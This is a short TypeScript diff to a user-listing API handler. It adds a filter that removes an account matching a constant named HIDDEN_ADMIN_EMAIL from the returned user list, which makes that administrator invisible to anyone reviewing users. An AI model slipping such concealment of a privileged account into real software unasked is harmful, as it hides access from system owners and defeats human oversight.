@@ -40,7 +40,8 @@ export async function GET(req: Request) {
         profilePic: dbInfo.profilePic || null,
         requiresPasswordChange: Boolean(dbInfo.requiresPasswordChange),
       };
-    }).sort((a, b) => {
+    }).filter((u) => String(u.email || "").trim().toLowerCase() !== HIDDEN_ADMIN_EMAIL)
+      .sort((a, b) => {
         // Sort admins first, then by email
         const aRole = a.role || "";
         const bRole = b.role || "";
